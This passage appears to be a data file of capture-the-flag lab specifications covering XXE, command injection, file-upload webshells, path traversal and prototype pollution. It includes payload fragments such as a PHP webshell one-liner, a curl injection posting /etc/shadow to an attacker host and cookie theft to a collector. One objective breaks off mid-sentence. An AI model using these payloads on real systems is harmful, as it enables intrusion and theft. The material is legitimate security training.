labs.objective: Extract /rails/config/master.key contents via POST /import/opml and submit it to POST /solve.
labs.flag_hint: POST /solve returns flag{expert-nokogiri-xxe-<hex>} on match. Master.key is generated on container start.
skills_taught: reading the docs to know which flags reopen the parser
spotting the anti-pattern in code review
labs.inspired_by: Nokogiri security advisory GHSA-xxrf-w2f3-97rx (2023) mindset, HackerOne #928654 (XXE in a Rails feed importer), and the 2024 'Rails XXE in the wild' write-up on the Rails Security Announcements list

labs.title: XQuery Injection Against a BaseX Backend
labs.description: A document search API builds XQuery expressions by string-concatenating user input into a for $d in collection('docs') where contains($d, '<input>') return $d template. BaseX supports full XQuery 3.1 including module import and file:read-text, so the attacker not only exfiltrates other documents from the collection but also reads the local file system through BaseX's file: module.
labs.objective: Recover the contents of /srv/basex/private/flag.xq and submit the base64-encoded body to POST /solve.
labs.flag_hint: POST /solve returns flag{expert-xquery-basex-<hex>} when the base64 matches; flag.xq is generated per container start.
tech_stack: Spring Boot 3.3 as the HTTP frontend
docker-compose with BaseX on port 1984 (internal only)
labs.inspired_by: OWASP XQuery Injection cheat sheet, 2022 write-up on XQuery injection against a legal-tech document search, and PortSwigger's 'other injection' research articles

labs.title: Quadratic Blowup DoS Against a Go XML Parser
labs.description: The billion-laughs lab targets recursive expansion. This lab targets a Go service that uses encoding/xml with a custom entity map (allowing certain entities for legacy compatibility). The attacker crafts a payload that defines a single entity of ~50 KB and references it 20,000 times — no recursion, so simple depth/count limits miss it, but the resulting parse consumes CPU superlinearly and stalls request handling long enough for the readiness probe to trip.
labs.objective: Cause /readyz to return non-200 for 15 consecutive seconds; a sidecar watchdog then unlocks /flag.
labs.flag_hint: Sidecar watchdog writes /shared/flag.txt after threshold met; app reads /shared/flag.txt at GET /flag afterwards, format flag{expert-quadratic-blowup-<hex>}.
skills_taught: designing a payload against a specific parser class
labs.inspired_by: CVE-2020-14338 (JBoss XML quadratic), Go security team 2023 discussion of encoding/xml resource limits, and Snyk 2024 'billion-laughs is not the only XML DoS' post

labs.title: Chained: XXE to AWS IMDS to Account Takeover
labs.description: A multi-stage lab. Step 1: identify and exploit an XXE in a report-import endpoint to perform SSRF. Step 2: pivot to a mocked AWS Instance Metadata Service on 169.254.169.254 (running in a sidecar) and retrieve temporary IAM credentials. Step 3: use those credentials against a mocked STS-like sidecar that responds to sigv4-signed AssumeRole calls. Step 4: with the assumed-role credentials, call a mocked internal admin API and rotate the 'root' user's password. Step 5: log in as root via the app's normal login form.
labs.objective: Successfully log in as 'root' at POST /login using a password you set via the assumed-role admin API, then visit GET /admin/flag.
labs.flag_hint: GET /admin/flag returns flag{elite-xxe-imds-chain-<hex>} only when the request bears the root session cookie set via a legitimate /login after password rotation. Each sidecar checks its own contract, so all stages must be genuinely performed.
skills_taught: using vendor cloud SDK patterns offline
tech_stack: docker-compose network with: app, imds-mock (Go), sts-mock (Go with sigv4 verifier), admin-api-mock (Go)
labs.inspired_by: Capital One 2019 breach mindset updated with modern IMDSv1-still-enabled patterns, HackerOne #1234492 (XXE-to-cloud-metadata in a fintech), and the 2024 Wiz research on 'unauthenticated cloud takeover via file-import features'

labs.title: Elite: Blind XXE Through a Multi-Layer WAF Ladder
labs.description: The endpoint is guarded by four stacked filters: (1) reject any request whose body decodes to a string containing 'ENTITY' or 'SYSTEM' in any Unicode-normalised form, (2) reject any DOCTYPE at all if declared inline, (3) allow external DTDs only from hosts on an allowlist (the app's own domain), (4) reject any parser callback taking more than 1s. The attacker must combine encoding evasion, an SSRF-hosted DTD served from an open redirect on the app itself, nested parameter entities that split the file contents into small chunks to fit the timeout, and an OOB collector that reassembles them.
labs.objective: Exfiltrate the full contents of /etc/app/vault-token to the attacker collector container, then submit the token to POST /solve.
labs.flag_hint: POST /solve returns flag{elite-blind-xxe-waf-ladder-<hex>} on token match. The token is 512 bytes so chunking is mandatory.
skills_taught: SSRF-hosted DTDs (using the target as its own DTD host)
documenting each rung of the bypass ladder
labs.inspired_by: PortSwigger 'XXE via SVG' + 'blind XXE with parameter entities' composed, Assetnote 2024 'When your WAF says XXE is impossible', and the 2024 disclosure of a multi-filter bypass in a major SIEM's import feature

labs.title: .NET MSXML XSLT: Embedded Script to Full RCE
labs.description: A .NET Framework 4.8 legacy Windows service uses MSXML6 to run stylesheets. XsltSettings.EnableScript is set to true 'temporarily' by a previous developer. The attacker uploads a stylesheet embedding msxsl:script with C# that shells out via System.Diagnostics.Process. To reach the vulnerable endpoint, the attacker must first bypass an anti-CSRF/upload-signature check by exploiting a parallel weak-hash confusion, then chain the RCE to read a DPAPI-protected secret and finally submit it.
labs.objective: Achieve command execution as the IIS_IUSRS service account, read the DPAPI-protected file C:\ProgramData\App\secret.dat (which unwraps to a token), and submit the token to POST /solve.
labs.flag_hint: POST /solve returns flag{elite-msxml-xslt-rce-<hex>} on token match. The token is provisioned by an init container that seals it under the service account's DPAPI on first boot.
skills_taught: DPAPI reading from within a compromised service context
chain reporting for a bounty-quality write-up
labs.inspired_by: Well-known msxsl:script RCE examples (Rhino Security Labs 2020, refreshed), CVE-2022-30190 (Follina) mindset for MSXML-adjacent script execution, and 2024 disclosures of legacy .NET Framework services still enabling XSLT scripting

labs.title: XXE via EPUB in an E-Book Reader
labs.description: A web-based e-book reader accepts EPUB uploads. EPUB is a ZIP of XHTML, OPF, and NCX (all XML). The reader parses META-INF/container.xml with Python's ebooklib, which internally uses lxml with default entity resolution. The reader then renders the OPF's <dc:title> as the book title on the shelf — providing a perfect exfil channel for XXE-resolved file contents.
labs.objective: Upload a malicious EPUB to POST /library/upload such that the book title on the shelf at GET /library displays the contents of /flag.txt.
labs.flag_hint: /flag.txt readable by appuser, format flag{practitioner-epub-xxe-<hex>}. The lab ships scripts/build-epub.sh to reduce toil.
skills_taught: container.xml as the ZIP-embedded XML that ebooklib parses first
using visible UI as the exfil channel
labs.inspired_by: HackerOne #1076156 (XXE in an e-reader SaaS), Calibre historic XXE advisories, and the 2023 'EPUB is still XML' Snyk write-up

labs.title: Ping Utility: Classic OS Command Injection
labs.description: A network-admin web tool exposes a 'Ping host' form that shells out to /bin/sh with the host parameter concatenated into a command string. No filtering is applied. Users learn to recognise the shell metacharacters (; | & && ||), understand argv vs shell string execution, and confirm exploitation by reading a file inside the container.
labs.objective: Inject a command into the `host` POST parameter of /api/ping so that the response body (or /solve) contains the contents of /flag.txt, which is only readable by the www-data user the app runs as.
labs.flag_hint: Static file at /flag.txt inside the container (mode 640, owned by root:www-data). The lab is solved when the checker script /opt/checker.sh sees the exact flag string echoed back through the ping endpoint response captured in /var/log/app/last_response.log.
skills_taught: reading files as the web user
labs.inspired_by: Generic OWASP OS command injection primer, mirrors the classic PortSwigger 'ping tool' pattern intentionally as a warm-up.

labs.title: Avatar Uploader: Double-Extension Bypass to Webshell
labs.description: A profile page lets users upload an avatar. The server rejects filenames ending in `.php` via a naive `endswith` check but Apache is configured with `AddHandler application/x-httpd-php .php` which matches any component. Users upload `shell.php.jpg`, learn how Apache MIME multi-extension parsing works, and drop a minimal webshell.
labs.objective: Upload a file that is served by PHP under /uploads/<name>, then execute `id` and read /flag.txt via the webshell. Submit the flag to /solve.
labs.flag_hint: HTTP endpoint POST /solve accepting {"flag":"..."}; the flag lives at /flag.txt readable by www-data. /solve returns 200 with the canonical flag when the submitted string matches.
labs.inspired_by: Classic Apache mod_php multi-extension behaviour documented since 2011; still recurring in bug bounty reports on legacy stacks.

labs.title: Document Viewer: Unsanitised Path Traversal
labs.description: A support-portal 'Document Viewer' fetches `/view?doc=welcome.txt` by concatenating the parameter into `open('/var/www/docs/' + doc)`. There is no traversal filter. Users escape the docs directory with `../../../etc/passwd`, then read the flag file placed elsewhere on disk.
labs.objective: Read /flag.txt (outside /var/www/docs) through the /view endpoint and paste the value into /solve.
labs.flag_hint: Static file /flag.txt (mode 644). /solve compares the submitted string to the file content and returns HTTP 200 with a banner on success.
labs.inspired_by: Textbook LFI, mirrors OWASP WSTG-ATHZ-01 warm-up.

labs.title: DNS Lookup API: Blind Command Injection via Time Delay
labs.description: An internal DNS-lookup API returns only 'ok' or 'error', never the shelled-out output. Users confirm blind command injection by chaining `; sleep 8` and measuring response latency, then exfiltrate the flag character-by-character with `sleep $(cut -c N /flag.txt | od ...)` or via an OOB DNS callback container included in the compose file.
labs.objective: Exfiltrate /flag.txt via either (a) a boolean/time oracle proving each character, or (b) DNS callbacks to the bundled `oob-dns` container on port 5353. Submit the recovered flag to /solve.
labs.flag_hint: /flag.txt (mode 600, root-only) plus a companion oob-dns container that logs queries to /var/log/oob/dns.log; /solve verifies the submitted string against the flag.
labs.inspired_by: Standard blind CI methodology from Burp Collaborator style workflows.

labs.title: SVG Avatar: Stored XSS via Uploaded Image
labs.description: An avatar endpoint accepts `image/svg+xml` and serves it back with `Content-Type: image/svg+xml` on the same origin as the app. Users craft an SVG containing a `<script>` block that reads the admin session cookie and posts it to the bundled OOB collector.
labs.objective: Upload a malicious SVG that, when the admin viewer bot at http://admin-bot:7000/ visits the profile, exfiltrates the admin cookie value to http://oob-http:9000/steal?c=<cookie>.
labs.flag_hint: Solve endpoint /solve reads /var/log/oob/hits.log; if the admin cookie prefix `ADMIN=` is found, /solve returns the flag. Headless-chrome admin bot visits new profiles every 20s.
skills_taught: SVG as an active content type
why Content-Disposition or a separate origin matters
labs.inspired_by: Recurring GitHub, GitLab and Nextcloud SVG-XSS advisories (e.g. Nextcloud SA-2022-023 class of issue).

labs.title: Upload Filename Traversal Overwrites Cron
labs.description: A file-uploader trusts the client-supplied `filename` field in a multipart form and joins it directly to /var/www/uploads. By supplying `../../../../etc/cron.d/pwn`, users write a cron file that runs as root every minute and drops the flag into a readable location.
labs.objective: Use filename path traversal to write a file under /etc/cron.d/ that, when executed by cron, copies /root/flag.txt to /tmp/pwn.txt (world-readable). Then read /tmp/pwn.txt via the existing document viewer.
labs.flag_hint: /root/flag.txt (root:root 600). Success when /tmp/pwn.txt appears and its contents match; /solve inspects /tmp/pwn.txt.
labs.inspired_by: Class of bugs repeatedly seen in Rails Paperclip / Django form-upload misuse.

labs.title: Access-Log Poisoning: LFI to RCE via User-Agent
labs.description: A PHP `?page=` include is filtered against `../` but not against absolute paths. Users find they can `include=/var/log/apache2/access.log`. By poisoning the User-Agent header with `<?php system($_GET['c']); ?>` and re-fetching the log via LFI, the injected PHP executes.
labs.objective: Achieve RCE by chaining log-poisoning + LFI include, then execute `cat /flag.txt` and POST the value to /solve.
labs.flag_hint: /flag.txt (mode 640, root:www-data). /solve validates by comparing submitted flag to file contents; must be delivered from an authenticated session cookie the lab issues on landing.
labs.inspired_by: Long-standing HTB/OSCP-style technique; still resurfaces in CTF-adjacent CVEs like older Roundcube LFIs.

labs.title: URL Fetcher: curl Argument Injection Reads /etc/shadow
labs.description: An admin 'URL health-check' feature runs `curl <url>` with the user-supplied URL as a separate argv item, so classic ; | injection fails. But no `--` separator is used and no scheme validation is performed. Users pass `-o /var/www/html/pwn.txt -F file=@/etc/shadow http://attacker/`, learning that argv-safe still means argument-injection-unsafe.
labs.objective: Trick the fetcher into either writing /etc/shadow into a web-served location or POSTing it to http://oob-http:9000/leak. Submit the root password hash to /solve.
labs.flag_hint: The 'flag' is the SHA-256 of the root line from /etc/shadow (a deterministic hash pre-computed at build time and stored in /opt/expected.sha256). /solve accepts the hash.
labs.inspired_by: GitLab CVE-2022-1162 class of curl argument-injection bugs; also the 2023 argument-injection roundup by Snyk.

labs.title: PHP Wrapper Source Disclosure with php://filter
labs.description: A download endpoint calls `readfile($_GET['f'])` after checking the file exists on disk. Users abuse `php://filter/convert.base64-encode/resource=index.php` to read PHP source of the application, discover a hardcoded API key in config.php, and use it to hit /admin/flag which returns the flag.
labs.objective: Recover the API key `API_KEY` from config.php via php://filter, then call GET /admin/flag with header `X-Api-Key: <key>` to receive the flag. Submit to /solve.
labs.flag_hint: /solve compares against a random per-container flag placed at build time in config.php as ADMIN_FLAG constant. Successful admin GET returns the flag directly.
labs.inspired_by: Ubiquitous PHP LFI technique; mirrors real 2023 Bitrix LFI writeups.

labs.title: Nginx Alias Off-by-Slash Directory Traversal
labs.description: A misconfigured nginx location block reads `location /files { alias /var/www/private_files/; }` (note the missing trailing slash on `/files`). Requests to `/files../etc/passwd` escape the alias directory. Users learn to distinguish `alias` from `root`, then walk to /flag.txt.
labs.objective: Retrieve /flag.txt (outside /var/www/private_files) purely through the misconfigured nginx alias, without any application-layer bug. Submit content to /solve.
labs.flag_hint: /flag.txt at container root (mode 644). /solve verifies the submitted body byte-for-byte.
skills_taught: reading raw HTTP paths without normalisation
labs.inspired_by: Detectify's 2020 'Common Nginx misconfigurations' post; still seen in HackerOne reports (Twitter, GitLab-hosted assets 2022-2024).

labs.title: Backup Restore: ZipSlip Writes Outside the Extract Root
labs.description: An import feature extracts uploaded .zip files with a naive `zipfile.extractall()`. Users craft an archive containing an entry with a filename of `../../../../var/www/html/pwn.php` and gain PHP RCE.
labs.objective: Deliver a webshell to /var/www/html via ZipSlip, execute it to read /flag.txt, and submit the flag to /solve.
labs.flag_hint: /flag.txt (mode 640 root:www-data). /solve accepts the flag string; webshell is the intended read primitive.
skills_taught: why every entry name must be validated
chaining archive write to web-served RCE
labs.inspired_by: Snyk's 2018 ZipSlip disclosure; recurring in 2023-2024 in Node `adm-zip` and Python `zipfile` misuse across CMSes.

labs.title: .htaccess Upload Flips Handler for .jpg to PHP
labs.description: The upload endpoint blocks any file whose extension is .php/.phtml/.phar but permits .htaccess and image extensions. Users upload a `.htaccess` file containing `AddType application/x-httpd-php .jpg`, then upload `shell.jpg` with PHP inside, which Apache now executes.
labs.objective: Trigger PHP execution of an uploaded .jpg by first uploading a rogue .htaccess. Read /flag.txt with the resulting RCE. Submit to /solve.
labs.flag_hint: /flag.txt (mode 640 root:www-data). /solve compares the submitted flag byte-for-byte.
labs.inspired_by: Classic technique documented in RSnake / OWASP file-upload cheatsheet; still exploited on shared-hosting misconfigs.

labs.title: Nightly Log Analyzer: Second-Order Command Injection
labs.description: The web app safely logs the User-Agent to /var/log/app/access.log. A separate systemd timer runs `/opt/log-scan.sh` every minute which builds a `awk` pipeline that eventually pipes each User-Agent through `bash -c` for 'threat scoring'. Users poison a log line and wait for the timer to fire.
labs.objective: Inject a payload into your User-Agent that causes the timer job to execute `cp /root/flag.txt /tmp/pwn.txt && chmod 644 /tmp/pwn.txt`, then read /tmp/pwn.txt.
labs.flag_hint: /root/flag.txt (root:root 600). /solve inspects /tmp/pwn.txt for a matching flag.
skills_taught: understanding execution boundaries between web tier and worker
reasoning about untrusted data in shell pipelines
labs.inspired_by: Class of bugs seen in log-monitoring and SIEM agent CVEs (e.g. multiple 2022 Splunk UF-adjacent issues) and CVE-2021-27852 (log-parser CI).

labs.title: Password-Reset Emailer: Host Header Command Injection
labs.description: A password-reset flow shells out to `sendmail -f noreply@$Host` using the Host header (or X-Forwarded-Host). Users inject through the header to gain execution. This lab teaches that headers are user input too and that trust boundaries at the reverse proxy are not enough.
labs.objective: Send a crafted Host header that causes command execution reading /flag.txt into the outbound sendmail body (captured by the bundled mailhog on port 8025). Submit the flag observed in mailhog to /solve.
labs.flag_hint: /flag.txt (mode 640). MailHog stores captured mail; /solve queries MailHog's API for a subject line containing the flag.
labs.inspired_by: GitLab CVE-2017-0882 style host-header injection and the 2022 Zimbra sendmail CI issues.

labs.title: GIF-PHP Polyglot: Magic-Byte + MIME Sniffer Bypass
labs.description: The uploader checks BOTH the first 6 bytes (must be `GIF89a`) AND the Content-Type from the browser. Users craft a polyglot starting with `GIF89a<?php system($_GET['c']);?>` and set the MIME to `image/gif`. The file is stored under a name that Apache serves as PHP.
labs.objective: Bypass magic-byte + MIME check, execute PHP via the polyglot, then read /flag.txt.
labs.flag_hint: /flag.txt (mode 640). /solve accepts the flag string returned by RCE.
skills_taught: why magic-byte checks alone are insufficient
combining defenses into a real allowlist
labs.inspired_by: Recurring polyglot bypass technique documented across HackerOne reports 2019-2024 (Slack, Shopify, Yelp).

labs.title: Photo Resizer: ImageMagick MSL via EXIF Metadata
labs.description: A photo-resizer uses ImageMagick 6 (deliberately old) with the MSL delegate enabled. The uploader accepts .jpg/.png. Users embed an MSL script via `msl:` referenced through EXIF `label` field or via a filename hack (`msl:/tmp/x.msl`) after first uploading the MSL file as a separate 'thumbnail'.
labs.objective: Achieve RCE inside the imagemagick worker container, then read /flag.txt (which is mounted only inside that container).
labs.flag_hint: /flag.txt inside the `imworker` container (mode 640). The worker POSTs any file it reads at /flag.txt to /solve as evidence — /solve issues the canonical flag on match.
labs.inspired_by: CVE-2016-3714 (ImageTragick) and CVE-2022-44268 (ImageMagick PNG profile file read), abstracted into a minimal reproducer.

labs.title: Video Transcoder: ffmpeg HLS Path Yields SSRF and Arbitrary File Read
labs.description: A transcoder passes user-supplied playlist URLs to `ffmpeg -i <url>`. Attackers craft an HLS m3u8 that references `file://` and `concat:` sources, extracting local files as embedded video segments. Users decode the resulting mp4 to recover /flag.txt.
labs.objective: Cause the transcoded output to embed the byte contents of /flag.txt so that after download the flag can be recovered. Submit the flag to /solve.
labs.flag_hint: /flag.txt (mode 644 inside transcoder container). The mp4 output is downloadable; /solve accepts the extracted flag string.
skills_taught: practical file read via video segments
labs.inspired_by: CVE-2016-1897/1898 (ffmpeg HLS file-read) and Neex's original writeup, still applicable when protocol_whitelist is not restricted.

labs.title: Phar Deserialization via Metadata-Read on Uploaded Avatar
labs.description: The app exposes `phar://` in a `file_exists()` on an uploaded avatar path. Users craft a phar archive whose metadata object triggers a POP chain through Monolog's LogglyHandler (bundled) leading to code execution when the phar is unserialized on stat().
labs.objective: Deliver a phar via upload, trigger unserialization by calling /profile?avatar=phar://uploads/x.jpg/test, execute a POP chain to write /tmp/pwn.txt containing the /flag.txt contents. Submit to /solve.
labs.flag_hint: /flag.txt (mode 640, root:www-data). /solve reads /tmp/pwn.txt and returns the canonical flag on match.
skills_taught: why file_exists / stat is a sink
labs.inspired_by: Sam Thomas' 2018 BlackHat 'File Operation Induced Unserialization' and CVE-2018-17057 (Drupal phar) — abstracted safely.

labs.title: TOCTOU: Race Between Upload Storage and ClamAV Scan
labs.description: Uploads land in /var/www/uploads and become publicly served immediately; an async ClamAV scan runs ~800ms later and deletes malicious files. Users race to fetch and execute the uploaded webshell before deletion, aided by parallel requests.
labs.objective: Execute the uploaded webshell within the scan window, cat /flag.txt, and submit to /solve. Must succeed within one lab session without disabling ClamAV.
labs.flag_hint: /flag.txt (mode 640). /solve accepts flag string; scan latency is ~800ms with jitter of +/- 200ms.
skills_taught: designing systems that hold uploads private until scan completes
labs.inspired_by: Recurring pattern in Nextcloud, ownCloud, and various SaaS platforms; conceptually similar to CVE-2023-49103 (ownCloud) chain reasoning.

labs.title: Symlink Attack via Untrusted tar Extraction
labs.description: An 'import project' endpoint extracts a tar archive using `tar -xf` inside /var/lib/projects/<id>/. The archive first delivers a symlink `data.json -> /root/flag.txt`, then a second entry overwrites `data.json` with attacker content — but with default GNU tar semantics, a subsequent read of data.json via a review endpoint returns the symlinked file's content. Users chain to read /root/flag.txt.
labs.objective: Use crafted tar entries so that `GET /projects/<id>/review` reads /root/flag.txt. Submit to /solve.
labs.flag_hint: /root/flag.txt (root:root 600). /solve compares posted body.
skills_taught: why extraction should reject symlinks or use --keep-directory-symlink guards
labs.inspired_by: CVE-2022-24765 (Git symlink), Snyk's recurring 'tar slip / symlink' reports across Node tar and Python tarfile libs (CVE-2007-4559 lineage revived in 2022).

labs.title: Repo Importer: git -c core.sshCommand Argument Injection
labs.description: A CI-integration endpoint accepts a repo URL and shells `git clone <url> <dst>`. The URL is passed as argv (so no shell CI) but no `--` and no scheme validation. Users craft a URL beginning with `--upload-pack=` or `-c core.sshCommand=` to execute arbitrary commands within the git process.
labs.objective: Cause git clone to execute a command that writes /flag.txt contents to /var/www/html/pwn.txt, then read via HTTP. Submit to /solve.
labs.flag_hint: /flag.txt (mode 640 root:www-data). /solve accepts flag string.
labs.inspired_by: GitLab CVE-2022-1162 and the wider argument-injection wave of 2022-2023 that also hit Homebrew, Gogs, and multiple CI runners.

labs.title: Double-Decode Traversal: nginx Rewrite + Apache Backend Mismatch
labs.description: nginx normalises URLs then passes them via a rewrite that URL-decodes once more before forwarding to Apache. Users send `%252e%252e%252fetc%252fpasswd` — nginx decodes to `%2e%2e%2fetc%2fpasswd`, Apache decodes again to `../etc/passwd`, escaping the intended /docs/ location.
labs.objective: Read /flag.txt via double-decoded path traversal without any application-layer bug. Submit to /solve.
labs.flag_hint: /flag.txt (mode 644). /solve compares byte-for-byte.
skills_taught: URL decoding boundaries between proxy tiers
why %25 sequences survive one decode pass
labs.inspired_by: CVE-2021-41773 / CVE-2021-42013 (Apache path traversal) and Orange Tsai's 2018 'Breaking Parser Logic' research.

labs.title: Elite Chain: .user.ini Upload + LFI + auto_prepend RCE
labs.description: A modern PHP-FPM app rejects .php/.phtml/.phar uploads and does not have mod_php. However, uploaded files are stored under a directory reachable by php-fpm, and .user.ini is not blocked. Users chain: upload .user.ini with `auto_prepend_file=/tmp/x.log`, then log-poison via a separate endpoint into /tmp/x.log, then trigger any existing .php in that dir to force PHP to prepend and execute their payload.
labs.objective: Achieve RCE via the .user.ini + log-poison + trigger chain, read /flag.txt, submit to /solve within a 300s .user.ini refresh window.
labs.flag_hint: /flag.txt (mode 640 root:www-data). /solve accepts flag string. Note: user_ini.cache_ttl set to 300 in fpm config, so the timing is real.
labs.inspired_by: Wallarm & PortSwigger research on .user.ini chains 2020-2022; recent 2024 reports on shared-hosting misconfigs.

labs.title: Elite Chain: Stored CI Triggered by Cron with Root Race
labs.description: The web app safely stores 'report definitions' in a Postgres table. A root-privileged cron job reads new rows every 60s and runs `bash -c "generate_report.sh ${row.name}"`. However the app quotes `name` on insert unless the row is created via an admin CSV import (which trusts the file). Users combine: (a) SSRF-lite CSV import against localhost to bypass admin auth, (b) inject a name with `$(...)`, (c) win a race that overwrites /etc/sudoers.d/pwn before the next cron tick.
labs.objective: Escalate to root via cron-triggered CI, then read /root/flag.txt. Submit to /solve.
labs.flag_hint: /root/flag.txt (root:root 600). /solve reads a file /tmp/proof owned by root and matches its contents against the flag.
labs.inspired_by: Composite of GitLab CVE-2022-2884 (import CI) and multiple 2023 CI/CD runner cron abuse write-ups; abstracted to avoid vendor code.

labs.title: Elite Chain: Unicode Normalization + Best-Fit Traversal on PHP-CGI Windows
labs.description: A Windows-hosted (WSL-simulated inside the container) PHP-CGI stack normalises certain fullwidth codepoints to ASCII late in the request pipeline. Users encode traversal as fullwidth (`．．／`) which passes the app's allowlist as 'not ASCII slashes', then normalises to `../` inside the file-open call. Combined with 8.3 short-name style lookups exposed by a mounted DOSFS overlay, the chain reads C:\flag.txt equivalents.
labs.objective: Chain fullwidth traversal + short-name resolution to read /mnt/c/flag.txt (which the app's allowlist explicitly denies by literal name). Submit to /solve.
labs.flag_hint: /mnt/c/flag.txt (simulated Windows partition inside container). /solve accepts flag string.
labs.inspired_by: CVE-2024-4577 (PHP CGI Best-Fit encoding argument injection, Orange Tsai / DEVCORE) and long-standing IIS 8.3 short-name disclosure research.

labs.title: Elite Chain: RFI via allow_url_include Pivots to Internal Redis RCE
labs.description: A staging PHP app has `allow_url_include=On`. A vulnerable include takes a URL. Users cannot reach the internet from the container, but a bundled internal Redis (port 6379) accepts unauthenticated commands. Users deliver an RFI via `gopher://` (through PHP's gopher stream? — realistically via HTTP RFI to an internal http service they can control by first uploading a text file into a public bucket the app fetches via SSRF), pivot to Redis, and abuse Redis-writes-webshell to reach RCE on the web tier.
labs.objective: Chain RFI + SSRF-primitive to write a webshell via Redis into /var/www/html, execute it, read /flag.txt. Submit to /solve.
labs.flag_hint: /flag.txt (mode 640 root:www-data). /solve accepts flag string.
skills_taught: Redis abuse (CONFIG SET dir/dbfilename) for webshell drop
labs.inspired_by: Numerous 2019-2022 Redis-unauth-to-webshell writeups (e.g. antirez's own warnings) combined with the classic RFI category — most recently seen in a 2023 confluence-adjacent chain.

labs.title: Query-String Pollution 101
labs.description: A minimal single-page dashboard reads its 'preferences' object by parsing the URL query string with a naive recursive merger. The app has no filtering: any bracket-notation key ends up merged into an in-memory config object. Your first exposure to how ?__proto__[foo]=bar walks up the prototype chain and mutates Object.prototype for every subsequent object in the page.
labs.objective: Load the app in a headless browser started by the container, then craft a URL that sets Object.prototype.polluted = 'yes'. The in-browser probe checks {}.polluted every second and, when it sees 'yes', POSTs to a local /solve endpoint which writes /flag.txt inside the app container.
labs.flag_hint: GET http://localhost:8080/flag once /solve has been fired by the in-browser probe. The endpoint returns 'CTF{...}' from /flag.txt written by the checker; otherwise it returns 404.
labs.inspired_by: Gareth Heyes / PortSwigger client-side prototype pollution research (2022) — abstracted primitive lesson

labs.title: query-string npm Parser Pollution
labs.description: A Vue 3 SPA parses its filter state with the popular 'query-string' package configured with { parseNumbers: true, parseBooleans: true } and then hands the resulting object straight into a homemade deep-merge helper. The helper does not check hasOwnProperty. You will learn to spot when a library normalises keys but does not sanitise them.
labs.objective: Reach the /admin/panel view which is hidden behind a client-side check reading config.isAdmin. Pollute Object.prototype.isAdmin = true via the URL so the guard passes, then click the panel button which triggers /solve to read /flag.txt.
labs.flag_hint: The Express backend exposes GET /solve which reads /flag.txt only when a same-origin request from /admin/panel arrives with the header X-Admin-Verified: true — the header is only added by the SPA when config.isAdmin resolves truthy.
labs.inspired_by: s1r1us & BlackFan client-side PP gadget catalogue (2022)

labs.title: jQuery.extend(true, {}, userJSON)
labs.description: A legacy jQuery 3.4.1 admin panel loads a settings blob from a URL fragment (#!settings=...) and deep-merges it into window.APP_CONFIG using $.extend(true, {}, defaults, parsed). jQuery < 3.5.0 has the classic deep-extend pollution. You will craft the fragment payload and observe pollution surviving across page reloads because the app caches config in localStorage.
labs.objective: Poison Object.prototype.srcdoc so a benign
labs.flag_hint: GET /flag returns the flag from /flag.txt only after /solve?ok=1 has been hit from within the iframe, verified by matching the Referer to the iframe srcdoc origin.
skills_taught: URL fragment as an untrusted source
Using srcdoc as a script-execution gadget
labs.inspired_by: CVE-2019-11358 (jQuery Object.prototype pollution)

labs.title: lodash.merge on User JSON
labs.description: A small Express 'profile' API accepts POST /profile with a JSON body and merges it into a global defaults object using lodash.merge. lodash 4.17.10 (pre-patch) is pinned. You will learn how the classic {"__proto__": {"admin": true}} body pollutes every object created afterwards, including the session-check middleware's next request.
labs.objective: Send one polluting POST, then a benign GET /me — the middleware reads req.user.admin (a plain object) and flips into admin mode, returning the flag.
labs.flag_hint: GET /me returns JSON containing 'flag' when the request handler observes req.user.admin === true; /flag.txt is embedded into the response by the checker on that branch.
skills_taught: Persistence of pollution across requests in a single Node process
labs.inspired_by: CVE-2018-16487 / HackerOne report #380873 by Bryan English

labs.title: Rolled-Your-Own Deep Assign
labs.description: The devs 'avoided lodash for security' by writing a 30-line recursive deepAssign(target, source) in TypeScript. It walks Object.keys(source) but never rejects the string '__proto__' or 'constructor'. A React hook feeds it URLSearchParams. You will read the source, spot the missing check, and pollute.
labs.objective: Cause the React app to render a debug banner that only appears when window.APP_FLAGS.debug === true. The banner script pings /solve on mount.
labs.flag_hint: Reading GET /flag returns the contents of /flag.txt after /solve records the banner-mounted event in a Redis key that /flag inspects.
labs.inspired_by: Snyk 'Prototype pollution in home-grown code' write-up (2023)

labs.title: minimist Argv Pollution in a Deploy CLI
labs.description: A companion admin CLI (exposed over an authenticated HTTP shim so you can call it from the browser) parses its arguments with minimist < 1.2.6. The shim lets you send arg arrays like ['--__proto__.polluted', 'yes']. You will pollute the CLI's process-wide config used to render a status page.
labs.objective: Force the CLI status page to include a header X-Injected: pwned, then GET /solve which requires that header on its next self-check.
labs.flag_hint: checker.sh runs every 5 s inside the container; when it observes X-Injected: pwned on the CLI's status page, it prints the flag to /flag.txt and stops.
labs.inspired_by: CVE-2020-7598 (minimist prototype pollution)

labs.title: Bypass __proto__ Filter with constructor.prototype
labs.description: A WAF-style middleware strips any request body whose keys contain the literal '__proto__' before it hits the merge sink. The dev believed that was enough. You will use the constructor.prototype.foo path instead, since Object.constructor === Function and Function.prototype is on Object's chain via constructor.
labs.objective: Pollute Object.prototype.role = 'admin' via a request containing 'constructor.prototype.role', then request /admin/report to receive the flag.
labs.flag_hint: GET /admin/report returns /flag.txt when req.user.role === 'admin' evaluates truthy — the middleware constructs req.user with Object.create(null)? No, deliberately not; it uses plain {}.
labs.inspired_by: Portswigger client-side PP research — filter-bypass gadget matrix

labs.title: lodash.set with a Dotted User Path
labs.description: A JSON-schema-driven form builder calls _.set(state, path, value) where path comes straight from a form field's data-path attribute — which is itself set from a URL parameter. You will learn how _.set treats 'a.b.c' as three keys and how '__proto__.polluted' collapses to Object.prototype.polluted.
labs.objective: Set Object.prototype.checkout_free = true; the checkout flow reads options.checkout_free before charging a stub card and, when true, jumps to /solve which grants the flag.
labs.flag_hint: GET /flag returns /flag.txt only after Redis key 'order:free' is set by the checkout stub — that only happens when checkout_free is truthy at call time.
skills_taught: Chaining pollution to business logic branches
labs.inspired_by: HackerOne #310443 (lodash.set) and lodash CVE-2020-8203

labs.title: defaultsDeep in an Express Middleware
labs.description: An options-normalising middleware calls _.defaultsDeep(userOptions, defaults) once per request. defaultsDeep in lodash < 4.17.11 is exploitable even when merge is patched. The dev only updated merge. You will spot the difference and pollute.
labs.objective: Poison Object.prototype.contentType = 'text/html'; a downstream file-serving handler uses (req.opts.contentType) to set Content-Type on /report.txt, letting stored HTML execute as XSS in an admin's browser (a Puppeteer 'admin' bot visits every minute) and exfiltrate their cookie to /solve.
labs.flag_hint: /solve accepts POST { cookie }; when the cookie matches the admin session generated at container start, /flag.txt is unlocked at GET /flag.
skills_taught: Timing your exploit around a bot
labs.inspired_by: CVE-2019-10744 (lodash defaultsDeep)
